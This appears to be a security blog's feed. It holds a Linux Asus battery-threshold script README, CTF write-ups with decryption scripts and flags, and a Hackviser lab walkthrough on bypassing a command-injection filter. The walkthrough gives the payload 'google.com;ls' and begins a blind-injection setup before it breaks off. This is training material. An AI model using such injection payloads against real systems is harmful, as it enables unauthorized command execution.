<p><strong>Author</strong>: <a href="https://github.com/sakibulalikhan"  class="extlink extlink-icon-5 "  title="sakibulalikhan" >@sakibulalikhan</a></p><figure class="post__image"><img decoding="async" loading="lazy" src="https://github.com/sakibulalikhan/asus-battery-health/assets/75080608/f72bc5c6-68f9-4a03-b7c4-463b30ee4d52" alt="image"  data-is-external-image="true"></figure><p>Asus laptops come with a built-in feature called <strong>Asus Battery Health Charging</strong>, which is often part of the MyAsus application. This feature allows users to set a charging threshold (typically 60%) when their laptop is connected to AC power. Keeping the battery charge at 60% helps mitigate heating issues, improves performance, and significantly prolongs the overall lifespan of the laptop battery.</p><p>Unfortunately, this feature is only available on Windows operating systems, leaving Linux users—including those on Ubuntu, Linux Mint, Elementary OS, Pop OS, Fedora, Arch, and others—without official support. This lack of support can discourage users from switching to Linux despite its performance advantages.</p><p>Fortunately, there is a solution! This script provides Linux users with the ability to implement battery charging thresholds, making Asus Battery Health Charging available across multiple Linux distributions.</p><p>The script has been tested on various Linux distributions, including <strong>Ubuntu</strong>, <strong>Linux Mint</strong>, <strong>PopOS</strong>, <strong>Elementary OS</strong>, <strong>Zorin OS</strong>, <strong>Fedora</strong>, <strong>AlmaLinux</strong>, <strong>Rocky Linux</strong>, <strong>Arch</strong>, <strong>Manjaro</strong>, and <strong>EndoverOS</strong>.</p><h2 id="usage">Usage</h2>
<p>To use the script, run the following command in your terminal:</p><pre><code class="language-bash">abh [-t &lt;charge_threshold&gt;] [-r] [-v] [-h]
</code></pre>
<pre><code class="language-bash">┏┓      ┳┓            ┓┏    ┓ ┓
┣┫┏┓┏┏  ┣┫┏┓╋╋┏┓┏┓┓┏  ┣┫┏┓┏┓┃╋┣┓
┛┗┛┗┻┛  ┻┛┗┻┗┗┗ ┛ ┗┫  ┛┗┗ ┗┻┗┗┛┗
                   ┛ @sakibulalikhan

Usage: /usr/bin/abh [-t &lt;charge_threshold&gt;] [-r] [-v] [-h]
Options:
  -t &lt;charge_threshold&gt;  Set the charge threshold (default: 60)
  -r                     Remove the charge threshold
  -v                     Enable verbose mode
  -h                     Display this help message
</code></pre>
<h2 id="options">Options</h2>
<p><strong>⚡ <code>-t &lt;charge_threshold&gt;</code></strong>: Sets the charge threshold (default: 60%). This option allows users to specify a custom charge threshold.</p><p>*<strong>�️ <code>-r</code></strong>: Removes the charge threshold. Use this option to disable battery health charging.</p><p>*<strong>� <code>-v</code></strong>: Enables verbose mode. This option provides additional output for troubleshooting.</p><p><strong>❓ <code>-h</code></strong>: Displays the help message. Use this option to view usage instructions.</p><h2 id="installation">Installation</h2>
<p>You can install the script easily by running the following commands:</p><pre><code class="language-bash">wget https://raw.githubusercontent.com/sakibulalikhan/asus-battery-health/main/abh &amp;&amp; sudo mv abh /usr/bin/ &amp;&amp; sudo chmod +x /usr/bin/abh &amp;&amp; abh
</code></pre>
<h3 id="manual-installation">Manual Installation</h3>
<p>*<strong>� Clone the repository</strong>:</p><pre><code class="language-bash">git clone https://github.com/sakibulalikhan/asus-battery-health.git
</code></pre>
<p>*<strong>�️ Navigate to the cloned directory</strong>:</p><pre><code class="language-bash">cd asus-battery-health-script
</code></pre>
<p>*<strong>� Give execution permission to the script</strong>:</p><pre><code class="language-bash">sudo chmod +x abh
</code></pre>
<p>*<strong>� Run the script</strong>:</p><pre><code class="language-bash">sh abh
</code></pre>
<p>Or</p><pre><code class="language-bash">./abh
</code></pre>
<h2 id="how-to-use">How to Use</h2>
<p><strong>⚡ Set the charge threshold to 60% (default)</strong></p><pre><code class="language-bash">abh -t  # Sets the charge threshold to 60%
</code></pre>
<p>*<strong>� Set the charge threshold to a custom value (e.g., 80%)</strong></p><pre><code class="language-bash">abh -t 80  # Sets the charge threshold to 80%
</code></pre>
<p>*<strong>� Run the script in verbose mode</strong></p><pre><code class="language-bash">abh -t 80 -v  # Sets the charge threshold to 80% and enables verbose mode
</code></pre>
<p><strong>❓ View help message</strong></p><pre><code class="language-bash">abh -h  # Displays help information
</code></pre>
<p>*<strong>�️ Remove the charge threshold</strong></p><pre><code class="language-bash">abh -r  # Removes the charge threshold
</code></pre>
<h2 id="contributing">Contributing</h2>
<p>*<strong>� Contributions are welcome!</strong> If you have any suggestions, improvements, or bug fixes, feel free to create an issue or submit a pull request.</p><h2 id="license">License</h2>
<p>This project is licensed under the <a href="https://github.com/sakibulalikhan/asus-battery-health/blob/main/LICENSE"  class="extlink extlink-icon-5 "  title="sakibulalikhan" >MIT License</a>.</p><h4 id="follow-me-on-twitter-sakibulalikhan">Follow me on Twitter: <a href="https://twitter.com/sakibulalikhan"  class="extlink extlink-icon-5 "  title="sakibulalikhan" >@sakibulalikhan</a></h4>
<h2 id="support-me">Support Me:</h2>
<p><a href="https://www.buymeacoffee.com/sakibulalikhan" target="_blank"  title="sakibulalikhan" ><img decoding="async" loading="lazy" src="https://www.buymeacoffee.com/assets/img/custom_images/orange_img.png" alt="Buy Me A Coffee" style="height: 41px !important;width: 174px !important;box-shadow: 0px 3px 2px 0px rgba(190, 190, 190, 0.5) !important;-webkit-box-shadow: 0px 3px 2px 0px rgba(190, 190, 190, 0.5) !important;"  data-is-external-image="true"></a></p>
            ]]>
        </content>
    </entry>
    <entry>
        <title>denied - A Web Challenge Walkthrough from AmateursCTF 2024</title>
        <author>
            <name>Sakibul Ali Khan</name>
        </author>
        <link href="https://sakibulalikhan.pages.dev/denied-amateursctf-2024-writeup.html"/>
        <id>https://sakibulalikhan.pages.dev/denied-amateursctf-2024-writeup.html</id>
        <media:content url="https://sakibulalikhan.pages.dev/media/posts/28/CTF_WEB_5_April-2.png" medium="image" />
            <category term="Web Security"/>
            <category term="CTFtime"/>
            <category term="CTF Writeups"/>

        <updated>2024-04-06T00:57:07+06:00</updated>
            <summary>
                <![CDATA[
                        <img src="https://sakibulalikhan.pages.dev/media/posts/28/CTF_WEB_5_April-2.png" alt="denied - A Web Challenge Walkthrough from AmateursCTF 2024" />
                    The AmateursCTF 2024 had a tricky web puzzle called "denied." They gave us a file named index.js for this challenge. When we went to the&hellip;
                ]]>
            </summary>
        <content type="html">
            <![CDATA[
                    <p><img src="https://sakibulalikhan.pages.dev/media/posts/28/CTF_WEB_5_April-2.png" class="type:primaryImage" alt="denied - A Web Challenge Walkthrough from AmateursCTF 2024" /></p>
                <p>The AmateursCTF 2024 had a tricky web puzzle called "denied." They gave us a file named index.js for this challenge. When we went to the website, all we saw was a message saying <code>Bad!</code> Nothing else, even when we peeked at the code behind the page.</p>
<figure class="post__image"><img decoding="async" loading="lazy"  src="https://sakibulalikhan.pages.dev/media/posts/28/Screenshot-2024-04-06-010542.png" alt="denied - AmateursCTF 2024 Writeup" width="1918" height="663" sizes="(min-width: 920px) 703px, (min-width: 700px) calc(82vw - 35px), calc(100vw - 81px)" srcset="https://sakibulalikhan.pages.dev/media/posts/28/responsive/Screenshot-2024-04-06-010542-xs.png 300w ,https://sakibulalikhan.pages.dev/media/posts/28/responsive/Screenshot-2024-04-06-010542-sm.png 480w ,https://sakibulalikhan.pages.dev/media/posts/28/responsive/Screenshot-2024-04-06-010542-md.png 768w ,https://sakibulalikhan.pages.dev/media/posts/28/responsive/Screenshot-2024-04-06-010542-lg.png 1024w"></figure>
<p>Let's checked out the <code>index.js</code> file to see what it was hiding:</p>
<p><strong>index.js:</strong></p>
<pre class="language-javascript line-numbers"><code>const express = require('express')
const app = express()
const port = 3000

app.get('/', (req, res) =&gt; {
  if (req.method == "GET") return res.send("Bad!");
  res.cookie('flag', process.env.FLAG ?? "flag{fake_flag}")
  res.send('Winner!')
})

app.listen(port, () =&gt; {
  console.log(`Example app listening on port ${port}`)
})</code></pre>
<p>This code sets up a basic Express.js server. It listens on port 3000. When you visit the root URL ("/") with a GET request, it checks if the request method is GET; if it is, it sends "Bad!" as the response. Otherwise, it sets a cookie named 'flag' with the value from the environment variable <code>process.env.FLAG</code>, or if that's not set, it uses "flag{fake_flag}". Finally, it sends "Winner!" as the response.</p>
<p>We decided to use a tool called BurpSuite to help us out. We intercepted and replayed requests using BurpSuite's Repeater, trying different methods.</p>
<figure class="post__image"><img decoding="async" loading="lazy"  src="https://sakibulalikhan.pages.dev/media/posts/28/Screenshot-2024-04-06-010847.png" alt="denied - AmateursCTF 2024 Writeup" width="525" height="279" sizes="(min-width: 920px) 703px, (min-width: 700px) calc(82vw - 35px), calc(100vw - 81px)" srcset="https://sakibulalikhan.pages.dev/media/posts/28/responsive/Screenshot-2024-04-06-010847-xs.png 300w ,https://sakibulalikhan.pages.dev/media/posts/28/responsive/Screenshot-2024-04-06-010847-sm.png 480w ,https://sakibulalikhan.pages.dev/media/posts/28/responsive/Screenshot-2024-04-06-010847-md.png 768w ,https://sakibulalikhan.pages.dev/media/posts/28/responsive/Screenshot-2024-04-06-010847-lg.png 1024w"></figure>
<p>After a few tries, we found out that only <code>GET</code> and <code>HEAD</code> methods worked, as shown by an <code>OPTIONS</code> request.</p>
<p>We went with the <code>HEAD</code> method and, lo and behold, we found a hidden, URL-encoded flag!</p>
<figure class="post__image"><img decoding="async" loading="lazy"  src="https://sakibulalikhan.pages.dev/media/posts/28/Screenshot-2024-04-06-012005.png" alt="denied - AmateursCTF 2024 Writeup" width="549" height="292" sizes="(min-width: 920px) 703px, (min-width: 700px) calc(82vw - 35px), calc(100vw - 81px)" srcset="https://sakibulalikhan.pages.dev/media/posts/28/responsive/Screenshot-2024-04-06-012005-xs.png 300w ,https://sakibulalikhan.pages.dev/media/posts/28/responsive/Screenshot-2024-04-06-012005-sm.png 480w ,https://sakibulalikhan.pages.dev/media/posts/28/responsive/Screenshot-2024-04-06-012005-md.png 768w ,https://sakibulalikhan.pages.dev/media/posts/28/responsive/Screenshot-2024-04-06-012005-lg.png 1024w"></figure>
<p>To decode the flag, we used BurpSuite's <code>Decoder</code> feature and selected "Decode as URL" from the menu.</p>
<figure class="post__image"><img decoding="async" loading="lazy"  src="https://sakibulalikhan.pages.dev/media/posts/28/Screenshot-2024-04-06-012243.png" alt="denied - AmateursCTF 2024 Writeup" width="554" height="153" sizes="(min-width: 920px) 703px, (min-width: 700px) calc(82vw - 35px), calc(100vw - 81px)" srcset="https://sakibulalikhan.pages.dev/media/posts/28/responsive/Screenshot-2024-04-06-012243-xs.png 300w ,https://sakibulalikhan.pages.dev/media/posts/28/responsive/Screenshot-2024-04-06-012243-sm.png 480w ,https://sakibulalikhan.pages.dev/media/posts/28/responsive/Screenshot-2024-04-06-012243-md.png 768w ,https://sakibulalikhan.pages.dev/media/posts/28/responsive/Screenshot-2024-04-06-012243-lg.png 1024w"></figure>
<p>And there it was, the secret CTF challenge flag, decoded and ready for victory!</p>
<p>In the end, cracking the "Denied" challenge at AmateursCTF 2024 taught us the importance of not giving up and using our brains. By playing around with different methods and tools like BurpSuite, we were able to solve the puzzle and win. This challenge showed us that persistence and thinking outside the box are key in the world of cybersecurity puzzles.</p>
<p> </p>
            ]]>
        </content>
    </entry>
    <entry>
        <title>Makeshift - Cyber Apocalypse 2024: Hacker Royale CTF Writeup</title>
        <author>
            <name>Sakibul Ali Khan</name>
        </author>
        <link href="https://sakibulalikhan.pages.dev/makeshift-cyber-apocalypse-2024-hacker-royale-ctf-writeup.html"/>
        <id>https://sakibulalikhan.pages.dev/makeshift-cyber-apocalypse-2024-hacker-royale-ctf-writeup.html</id>
        <media:content url="https://sakibulalikhan.pages.dev/media/posts/27/Makeshift-Cyber-Apocalypse-2024-Hacker-Royale-CTF-Writeup.png" medium="image" />
            <category term="HackTheBox"/>
            <category term="Crypto"/>
            <category term="CTFtime"/>
            <category term="CTF Writeups"/>

        <updated>2024-03-16T05:32:51+06:00</updated>
            <summary>
                <![CDATA[
                        <img src="https://sakibulalikhan.pages.dev/media/posts/27/Makeshift-Cyber-Apocalypse-2024-Hacker-Royale-CTF-Writeup.png" alt="Makeshift - Cyber Apocalypse 2024: Hacker Royale CTF Writeup" />
                    In the midst of the Cyber Apocalypse 2024: Hacker Royale CTF hosted by HackTheBox, participants faced the grueling challenge of “crypto_makeshift.” Struggling to survive in&hellip;
                ]]>
            </summary>
        <content type="html">
            <![CDATA[
                    <p><img src="https://sakibulalikhan.pages.dev/media/posts/27/Makeshift-Cyber-Apocalypse-2024-Hacker-Royale-CTF-Writeup.png" class="type:primaryImage" alt="Makeshift - Cyber Apocalypse 2024: Hacker Royale CTF Writeup" /></p>
                <div class="cl-preview-section">
<p>In the midst of the Cyber Apocalypse 2024: Hacker Royale CTF hosted by HackTheBox, participants faced the grueling challenge of “crypto_makeshift.” Struggling to survive in a barren landscape, scavengers hunted for a weapon to fend off hunger and potential adversaries. Let’s delve into the tactics and triumphs of decrypting “crypto_makeshift.”</p>
</div>
<div class="cl-preview-section">
<p><strong>Challenge Description:</strong></p>
</div>
<div class="cl-preview-section">
<p>In the desolate wilderness, resources were scarce, and survival hinged on ingenuity. Participants stumbled upon a long stick protruding from the undergrowth, recognizing its potential as a weapon. However, the stick required sharpening to become truly effective. Amidst the struggle for survival, this makeshift weapon held the promise of salvation.</p>
</div>
<div class="cl-preview-section">
<p><strong>The Hunt Begins:</strong></p>
</div>
<div class="cl-preview-section">
<p>To unlock the hidden message and secure their victory, participants were provided with a Python script named <code>source.py</code> and an output file <code>output.txt</code>. The script revealed a peculiar encryption process applied to the flag stored in the <code>FLAG</code> variable.</p>
</div>
<div class="cl-preview-section">
<pre class="language-python line-numbers"><code>from secret import FLAG

flag = FLAG[::-1]
new_flag = ''

for i in range(0, len(flag), 3):
    new_flag += flag[i+1]
    new_flag += flag[i+2]
    new_flag += flag[i]

print(new_flag)
</code></pre>
</div>
<div class="cl-preview-section">
<p>The output file <code>output.txt</code> contained the encrypted message, challenging participants to decrypt it and unveil the true flag.</p>
</div>
<div class="cl-preview-section">
<pre><code>!?}De!e3d_5n_nipaOw_3eTR3bt4{_THB
</code></pre>
</div>
<div class="cl-preview-section">
<p><strong>Sharpening the Weapon:</strong></p>
</div>
<div class="cl-preview-section">
<p>To decipher the encrypted message and retrieve the flag, participants needed to reverse engineer the encryption process. By understanding the swapping mechanism in the script, they could decrypt the ciphertext.</p>
</div>
<div class="cl-preview-section">
<pre class="language-python line-numbers"><code>new_flag = '!?}De!e3d_5n_nipaOw_3eTR3bt4{_THB'
reversed_flag = ''

# Reverse the swapping process
for i in range(0, len(new_flag), 3):
    reversed_flag += new_flag[i+2]
    reversed_flag += new_flag[i]
    reversed_flag += new_flag[i+1]

# Reverse the reversed FLAG to get the original FLAG
original_flag = reversed_flag[::-1]

print(original_flag)
</code></pre>
</div>
<div class="cl-preview-section">
<p><strong>Claiming Victory:</strong></p>
</div>
<div class="cl-preview-section">
<p>With the decryption script in hand, participants decoded the encrypted message to reveal the flag, marking their triumphant escape from the brink of defeat.</p>
</div>
<div class="cl-preview-section">
<pre><code>HTB{4_b3tTeR_w3apOn_i5_n3edeD!?!}
</code></pre>
</div>
<div class="cl-preview-section">
<p><strong>Conclusion:</strong></p>
</div>
<div class="cl-preview-section">
<p>The “crypto_makeshift” challenge epitomized the resourcefulness and determination required to survive in the Cyber Apocalypse. Participants overcame the adversity of the barren landscape and unlocked the secrets hidden within the encrypted message, emerging victorious in their quest for survival.</p>
</div>
<div class="cl-preview-section">
<p>As the Cyber Apocalypse 2024: Hacker Royale continued, participants braced themselves for further trials, armed with the lessons learned and the camaraderie forged in the heat of battle.</p>
</div>
<div class="cl-preview-section">
<p>Stay tuned for more thrilling CTF adventures!</p>
</div>
            ]]>
        </content>
    </entry>
    <entry>
        <title>Dynastic - Cyber Apocalypse 2024: Hacker Royale CTF Writeup</title>
        <author>
            <name>Sakibul Ali Khan</name>
        </author>
        <link href="https://sakibulalikhan.pages.dev/dynastic-cyber-apocalypse-2024-hacker-royale-ctf-writeup.html"/>
        <id>https://sakibulalikhan.pages.dev/dynastic-cyber-apocalypse-2024-hacker-royale-ctf-writeup.html</id>
        <media:content url="https://sakibulalikhan.pages.dev/media/posts/26/Dynastic-Cyber-Apocalypse-2024-Hacker-Royale-CTF-Writeup.png" medium="image" />
            <category term="HackTheBox"/>
            <category term="Crypto"/>
            <category term="CTFtime"/>
            <category term="CTF Writeups"/>

        <updated>2024-03-16T05:29:23+06:00</updated>
            <summary>
                <![CDATA[
                        <img src="https://sakibulalikhan.pages.dev/media/posts/26/Dynastic-Cyber-Apocalypse-2024-Hacker-Royale-CTF-Writeup.png" alt="Dynastic - Cyber Apocalypse 2024: Hacker Royale CTF Writeup" />
                    In the heart of the Cyber Apocalypse 2024: Hacker Royale CTF by HackTheBox, participants were thrust into a life-or-death scenario with the “Dynastic” challenge. With&hellip;
                ]]>
            </summary>
        <content type="html">
            <![CDATA[
                    <p><img src="https://sakibulalikhan.pages.dev/media/posts/26/Dynastic-Cyber-Apocalypse-2024-Hacker-Royale-CTF-Writeup.png" class="type:primaryImage" alt="Dynastic - Cyber Apocalypse 2024: Hacker Royale CTF Writeup" /></p>
                <div class="cl-preview-section">
<p>In the heart of the Cyber Apocalypse 2024: Hacker Royale CTF by HackTheBox, participants were thrust into a life-or-death scenario with the “Dynastic” challenge. With time ticking away and a lethal gas threatening to fill the chamber, the players had to decrypt a mysterious message to unlock their way to safety. Let’s dive into the eerie world of “Dynastic” and unravel its secrets.</p>
</div>
<div class="cl-preview-section">
<p><strong>Challenge Description:</strong></p>
</div>
<div class="cl-preview-section">
<p>Upon entering the challenge, participants found themselves trapped in a sealed gas chamber. A foreboding message revealed that within minutes, the chamber would be filled with deadly hydrogen cyanide. To escape this grim fate, they needed to unlock both the handcuffs restraining them and the exit door, using the same elusive passcode. The only clue: cryptic letters etched into the walls and a disturbing image of a Roman emperor.</p>
</div>
<div class="cl-preview-section">
<p><strong>The Journey Begins:</strong></p>
</div>
<div class="cl-preview-section">
<p>To decrypt the passcode, participants were provided with a Python script named <code>source.py</code> and an output file <code>output.txt</code>. The script revealed a custom encryption method based on an identity mapping scheme, encrypting the flag provided in <code>FLAG</code> variable.</p>
</div>
<div class="cl-preview-section">
<pre class="language-python line-numbers"><code>from secret import FLAG
from random import randint

def to_identity_map(a):
    return ord(a) - 0x41

def from_identity_map(a):
    return chr(a % 26 + 0x41)

def encrypt(m):
    c = ''
    for i in range(len(m)):
        ch = m[i]
        if not ch.isalpha():
            ech = ch
        else:
            chi = to_identity_map(ch)
            ech = from_identity_map(chi + i)
        c += ech
    return c

with open('output.txt', 'w') as f:
    f.write('Make sure you wrap the decrypted text with the HTB flag format :-]\n')
    f.write(encrypt(FLAG))
</code></pre>
</div>
<div class="cl-preview-section">
<p>The output file <code>output.txt</code> contained the encrypted message, hinting at the form of the final flag.</p>
</div>
<div class="cl-preview-section">
<pre><code>Make sure you wrap the decrypted text with the HTB flag format :-]
DJF_CTA_SWYH_NPDKK_MBZ_QPHTIGPMZY_KRZSQE?!_ZL_CN_PGLIMCU_YU_KJODME_RYGZXL
</code></pre>
</div>
<div class="cl-preview-section">
<p><strong>Cracking the Code:</strong></p>
</div>
<div class="cl-preview-section">
<p>To decipher the encrypted message and obtain the flag, participants needed to reverse engineer the encryption process. Armed with the provided <code>to_identity_map</code> and <code>from_identity_map</code> functions, they could decrypt the ciphertext.</p>
</div>
<div class="cl-preview-section">
<pre class="language-python line-numbers"><code>def to_identity_map(a):
    return ord(a) - 0x41

def from_identity_map(a):
    return chr(a % 26 + 0x41)

def decrypt(ciphertext):
    m = ''
    for i in range(len(ciphertext)):
        ch = ciphertext[i]
        if not ch.isalpha():
            dch = ch
        else:
            dchi = from_identity_map(to_identity_map(ch) - i)
            dch = dchi
        m += dch
    return m

ciphertext = "DJF_CTA_SWYH_NPDKK_MBZ_QPHTIGPMZY_KRZSQE?!_ZL_CN_PGLIMCU_YU_KJODME_RYGZXL"
plaintext = decrypt(ciphertext)
print(plaintext)
</code></pre>
</div>
<div class="cl-preview-section">
<p><strong>Celebrating Victory:</strong></p>
</div>
<div class="cl-preview-section">
<p>With the decryption script in hand, participants ran it to reveal the hidden message and claim their well-deserved victory.</p>
</div>
<div class="cl-preview-section">
<pre><code>HTB{DID_YOU_KNOW_ABOUT_THE_TRITHEMIUS_CIPHER?!_IT_IS_SIMILAR_TO_CAESAR_CIPHER}
</code></pre>
</div>
<div class="cl-preview-section">
<p><strong>Conclusion:</strong></p>
</div>
<div class="cl-preview-section">
<p>The “Dynastic” challenge provided an exhilarating experience, combining cryptography and problem-solving skills under intense pressure. Participants emerged victorious by unraveling the mysteries within the encrypted message, ultimately escaping the grim fate of the gas chamber. As the Cyber Apocalypse 2024: Hacker Royale continued, participants braced themselves for even more thrilling challenges that lay ahead.</p>
</div>
<div class="cl-preview-section">
<p>Stay tuned for more exciting CTF adventures!</p>
</div>
            ]]>
        </content>
    </entry>
    <entry>
        <title>Hackviser - Command Injection Filter Bypass</title>
        <author>
            <name>Sakibul Ali Khan</name>
        </author>
        <link href="https://sakibulalikhan.pages.dev/hackviser-command-injection-filter-bypass.html"/>
        <id>https://sakibulalikhan.pages.dev/hackviser-command-injection-filter-bypass.html</id>
        <media:content url="https://sakibulalikhan.pages.dev/media/posts/25/Hackviser-Command-Injection-Filter-Bypass.png" medium="image" />
            <category term="Web Security"/>
            <category term="Pentesting"/>
            <category term="OWASP 10"/>
            <category term="Hackviser"/>
            <category term="Command Injection"/>
            <category term="CTF Writeups"/>

        <updated>2024-02-29T15:49:44+06:00</updated>
            <summary>
                <![CDATA[
                        <img src="https://sakibulalikhan.pages.dev/media/posts/25/Hackviser-Command-Injection-Filter-Bypass.png" alt="Hackviser - Command Injection Filter Bypass" />
                    Command Injection Filter Bypass: This lab contains a Command Injection vulnerability that leads to remote command execution. The web application gives the domain name you&hellip;
                ]]>
            </summary>
        <content type="html">
            <![CDATA[
                    <p><img src="https://sakibulalikhan.pages.dev/media/posts/25/Hackviser-Command-Injection-Filter-Bypass.png" class="type:primaryImage" alt="Hackviser - Command Injection Filter Bypass" /></p>
                <h2 class="MuiBox-root css-lxebfo"><span class="MuiTypography-root MuiTypography-normalBold css-1r2482o">Command Injection Filter Bypass:</span></h2>
<div class="MuiCollapse-root MuiCollapse-vertical MuiCollapse-entered css-c4sutr">
<div class="MuiCollapse-wrapper MuiCollapse-vertical css-hboir5">
<div class="MuiCollapse-wrapperInner MuiCollapse-vertical css-8atqhb">
<div> </div>
<div class="MuiBox-root css-18puooo"><span style="color: var(--text-primary-color); font-family: var(--editor-font-family); font-size: inherit; font-weight: var(--font-weight-normal);">This lab contains a Command Injection vulnerability that leads to remote command execution.</span></div>
<div class="MuiBox-root css-1c8mvc2">
<div class="MuiBox-root css-1v8my8o">
<p>The web application gives the domain name you want to check as a parameter to the "nslookup" utility running on the terminal. If the domain name you are sending contains common commands or operators, your query will be blocked. Find a way to run a command on the system.</p>
<h4>What is the hostname address of the server where the website is running?</h4>
<figure class="post__image"><img decoding="async" loading="lazy"  src="https://sakibulalikhan.pages.dev/media/posts/25/hackviser_command_injection_filter_bypass.png" alt="Hackviser - Command Injection Filter Bypass" width="1356" height="423" sizes="(min-width: 920px) 703px, (min-width: 700px) calc(82vw - 35px), calc(100vw - 81px)" srcset="https://sakibulalikhan.pages.dev/media/posts/25/responsive/hackviser_command_injection_filter_bypass-xs.png 300w ,https://sakibulalikhan.pages.dev/media/posts/25/responsive/hackviser_command_injection_filter_bypass-sm.png 480w ,https://sakibulalikhan.pages.dev/media/posts/25/responsive/hackviser_command_injection_filter_bypass-md.png 768w ,https://sakibulalikhan.pages.dev/media/posts/25/responsive/hackviser_command_injection_filter_bypass-lg.png 1024w"></figure>
<div class="MuiBox-root css-lxebfo">
<div class="cl-preview-section">
<h3>What is OS Command Injection?</h3>
</div>
<div class="cl-preview-section">
<p>OS Command Injection represents a vulnerability wherein attackers can run arbitrary commands on the underlying operating system by manipulating user-provided input passed to system shell commands. This vulnerability emerges when web applications directly integrate user input into command strings sans adequate validation or sanitization.</p>
</div>
<div class="cl-preview-section">
<h3>Impact of OS Command Injection</h3>
</div>
<div class="cl-preview-section">
<p>OS Command Injection can result in severe consequences, including unauthorized access, data theft, or complete control over the target system. Attackers exploit this vulnerability to execute commands using the vulnerable application’s privileges, posing significant threats to system security and integrity.</p>
</div>
</div>
<div class="MuiCollapse-root MuiCollapse-vertical MuiCollapse-entered css-c4sutr">
<div class="MuiCollapse-wrapper MuiCollapse-vertical css-hboir5">
<div class="MuiCollapse-wrapperInner MuiCollapse-vertical css-8atqhb">
<div class="MuiBox-root css-1c8mvc2"> </div>
</div>
</div>
</div>
<p>Read more: <a href="https://sakibulalikhan.pages.dev/exploring-os-command-injection-understanding-and-hands-on-practice" title="Exploring OS Command Injection: Understanding and Hands-On Practice">Exploring OS Command Injection: Understanding and Hands-On Practice</a></p>
<p>Let's begin the journey to solve the challenge. Start by visiting the website, which includes a DNS Lookup feature. Enter any domain name, and it will provide DNS records for that domain.</p>
<figure class="post__image"><img decoding="async" loading="lazy"  src="https://sakibulalikhan.pages.dev/media/posts/25/hackviser_command_injection0.png" alt="Hackviser - Command Injection Filter Bypass" width="1193" height="451" sizes="(min-width: 920px) 703px, (min-width: 700px) calc(82vw - 35px), calc(100vw - 81px)" srcset="https://sakibulalikhan.pages.dev/media/posts/25/responsive/hackviser_command_injection0-xs.png 300w ,https://sakibulalikhan.pages.dev/media/posts/25/responsive/hackviser_command_injection0-sm.png 480w ,https://sakibulalikhan.pages.dev/media/posts/25/responsive/hackviser_command_injection0-md.png 768w ,https://sakibulalikhan.pages.dev/media/posts/25/responsive/hackviser_command_injection0-lg.png 1024w"></figure>
<p>I tested the website's functionality by entering Google's domain and received DNS information about the domain.</p>
<figure class="post__image"><img decoding="async" loading="lazy"  src="https://sakibulalikhan.pages.dev/media/posts/25/hackviser_command_injection1.png" alt="Hackviser - Command Injection Filter Bypass" width="1250" height="717" sizes="(min-width: 920px) 703px, (min-width: 700px) calc(82vw - 35px), calc(100vw - 81px)" srcset="https://sakibulalikhan.pages.dev/media/posts/25/responsive/hackviser_command_injection1-xs.png 300w ,https://sakibulalikhan.pages.dev/media/posts/25/responsive/hackviser_command_injection1-sm.png 480w ,https://sakibulalikhan.pages.dev/media/posts/25/responsive/hackviser_command_injection1-md.png 768w ,https://sakibulalikhan.pages.dev/media/posts/25/responsive/hackviser_command_injection1-lg.png 1024w"></figure>
<p><strong>Now time to work on exploit the app with Command Injection, Let's do it....</strong></p>
<p>Now, let's work on exploiting the app with Command Injection. I attempted a basic Command Injection payload, using <code>;ls</code> appended to the domain name in the input field and clicked the search button to see if it worked.</p>
<p>Payload: </p>
<pre class="language-bash line-numbers"><code>google.com;ls</code></pre>
<figure class="post__image"><img decoding="async" loading="lazy"  src="https://sakibulalikhan.pages.dev/media/posts/25/hackviser_command_injection2.png" alt="Hackviser - Command Injection Filter Bypass" width="1159" height="527" sizes="(min-width: 920px) 703px, (min-width: 700px) calc(82vw - 35px), calc(100vw - 81px)" srcset="https://sakibulalikhan.pages.dev/media/posts/25/responsive/hackviser_command_injection2-xs.png 300w ,https://sakibulalikhan.pages.dev/media/posts/25/responsive/hackviser_command_injection2-sm.png 480w ,https://sakibulalikhan.pages.dev/media/posts/25/responsive/hackviser_command_injection2-md.png 768w ,https://sakibulalikhan.pages.dev/media/posts/25/responsive/hackviser_command_injection2-lg.png 1024w"></figure>
<p>However, an error occurred due to blacklisted keywords. To execute Command Injection, we need to bypass this restriction. After several failed attempts, I revisited the machine intro and realized that "nslookup" was running in the background, hinting at the possibility of Blind Command Injection.</p>
<figure class="post__image"><img decoding="async" loading="lazy"  src="https://sakibulalikhan.pages.dev/media/posts/25/hackviser_command_injection3-2.png" alt="Hackviser - Command Injection Filter Bypass" width="1367" height="417" sizes="(min-width: 920px) 703px, (min-width: 700px) calc(82vw - 35px), calc(100vw - 81px)" srcset="https://sakibulalikhan.pages.dev/media/posts/25/responsive/hackviser_command_injection3-2-xs.png 300w ,https://sakibulalikhan.pages.dev/media/posts/25/responsive/hackviser_command_injection3-2-sm.png 480w ,https://sakibulalikhan.pages.dev/media/posts/25/responsive/hackviser_command_injection3-2-md.png 768w ,https://sakibulalikhan.pages.dev/media/posts/25/responsive/hackviser_command_injection3-2-lg.png 1024w"></figure>
<p>Now, you need to spin-up your BurpSuite Pro. Yes, you need to use the premium version of BurpSuite for further steps.</p>
<p>In your BurpSuite Pro, go to Collaborator, located on the top bar. Then, click the "Get Started" button below.</p>
<figure class="post__image"><img decoding="async" loading="lazy"  src="https://sakibulalikhan.pages.dev/media/posts/25/hackviser_command_injection4.png" alt="Hackviser - Command Injection Filter Bypass" width="1213" height="568" sizes="(min-width: 920px) 703px, (min-width: 700px) calc(82vw - 35px), calc(100vw - 81px)" srcset="https://sakibulalikhan.pages.dev/media/posts/25/responsive/hackviser_command_injection4-xs.png 300w ,https://sakibulalikhan.pages.dev/media/posts/25/responsive/hackviser_command_injection4-sm.png 480w ,https://sakibulalikhan.pages.dev/media/posts/25/responsive/hackviser_command_injection4-md.png 768w ,https://sakibulalikhan.pages.dev/media/posts/25/responsive/hackviser_command_injection4-lg.png 1024w"></figure>
<p>After doing that, you can find the "Copy to clipboard" option. Click there, and a URL will be copied to your clipboard.</p>
